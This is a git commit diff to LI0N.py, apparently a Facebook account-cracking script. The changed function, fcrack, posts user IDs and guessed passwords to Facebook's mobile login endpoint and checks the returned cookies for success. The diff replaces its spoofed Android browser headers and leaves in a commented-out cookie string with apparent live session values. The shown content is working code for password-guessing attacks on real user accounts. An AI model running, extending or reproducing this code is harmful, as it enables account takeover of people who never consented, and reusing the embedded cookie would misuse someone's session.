3026792c661680db1a652acfcb6677c5dc3a3fcf
sanaullah-007 <147726313+sanaullah-007@users.noreply.github.com>
2023-10-15 12:43:55 +0500

    LI0N.py

--- LI0N.py
+++ LI0N.py
@@ -1467,42 +1467,28 @@ def fcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'm.facebook.com',
-
-			'upgrade-insecure-requests': '1',
-
-			'viewport-width': '980',
-
-			'method': 'path',
-
-			'scheme': 'https',
-
-			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-
-			'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 
-
-			'dnt':'1', 
-
-			'x-requested-with':'mark.via.gp', 
-
-			'sec-fetch-site': 'none',
-
-			'sec-fetch-mode': 'navigate',
-
-			'sec-fetch-user': '?1',
-
-			'sec-fetch-dest': 'document',
-
-			'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
-
-			'cache-control': 'max-age=0',
-
-			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
-
-			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
-
-			"sec-ch-prefers-color-scheme": "light",
-
+            header_freefb = headers = {
+    'authority': 'p.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'datr=yDYhZTdZXqwWNg5SfMhuB0ZM; sb=yDYhZbyFXyKGicTsES0cmSiB; vpd=v1%3B865x480x2.25; locale=en_GB; x-referer=eyJyIjoiLyIsImgiOiIvYm9va21hcmtzLz9wYWlwdj0wJmVhdj1BZmFmQmFaRGVZOHhSQTAxblR3MkNQckF5LU12YmNiRERqWFAtT2JXSncxRXZtOE5qeGdBZl9mY2hTWHpRU3U3OWVvIiwicyI6Im0ifQ%3D%3D; wl_cbv=v2%3Bclient_version%3A2334%3Btimestamp%3A1697352253; m_pixel_ratio=2.25; wd=480x865; fr=0WMRmYQKhK7nljNb6.AWUcKqVih67PGmbDCwhRpTa9AEQ.BlK372.e1.AAA.0.0.BlK4xs.AWXCAHdQIcM',
+    'dpr': '2.25',
+    'referer': 'https://p.facebook.com/',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"706SH"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"10.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+    'viewport-width': '980',
 			'user-agent': pro}
             lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
